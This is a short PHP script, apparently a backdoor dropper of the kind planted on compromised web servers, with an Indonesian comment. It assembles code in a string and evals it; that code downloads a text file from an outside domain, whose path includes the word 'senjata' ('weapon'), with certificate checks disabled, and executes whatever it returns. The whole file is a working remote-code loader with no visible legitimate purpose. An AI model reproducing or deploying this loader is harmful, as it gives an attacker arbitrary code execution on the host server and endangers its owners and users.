<?php
$z = "";
$z .= "\$url = 'https://nightmarenyx.art/senjata/cihuy.txt';\n";
$z .= "\$ch = curl_init(\$url);\n";
$z .= "curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n";
$z .= "curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);\n";
$z .= "curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n";
$z .= "\$fileContents = curl_exec(\$ch);\n";
$z .= "curl_close(\$ch);\n";
$z .= "if (\$fileContents === false) {\n";
$z .= "    die('[!] component : https://nightmarenyx.art/senjata/cihuy.txt');\n";
$z .= "}\n";
$z .= "eval(\"?>\" . \$fileContents);\n";

// Jalankan kode dari string
eval($z);
?>